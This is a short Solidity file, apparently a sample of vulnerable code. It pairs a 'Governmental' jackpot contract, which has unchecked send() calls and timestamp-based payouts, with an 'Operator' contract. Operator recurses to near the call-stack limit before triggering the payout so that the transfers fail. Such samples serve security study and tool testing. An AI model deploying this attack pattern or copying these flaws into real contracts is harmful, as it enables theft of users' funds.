pragma solidity ^0.4.0;

contract Governmental {
  address public h;
  address public c;
  uint public e = 1 ether;
  uint public a;
  uint public ONE_MINUTE = 1 minutes;

  function Governmental() {
    h = msg.sender;
    if (msg.value<1 ether) throw;
  }

  function g() {
    if (msg.value<e/2) throw;
    c = msg.sender;
    e += msg.value/2;
    a = block.timestamp;
  }

  function b() {
    if (block.timestamp < a+ONE_MINUTE)
      throw;

    c.send(e);
    h.send(this.balance-1 ether);

    c = 0;
    e = 1 ether;
    a = 0;
  }
}

contract Operator {

  function d(address f, uint i) {
    if (0<=i && i<1023) {
      this.d.gas(msg.gas-2000)(f, i+1);
    }
    else {
      Governmental(f).b();
    }
  }
}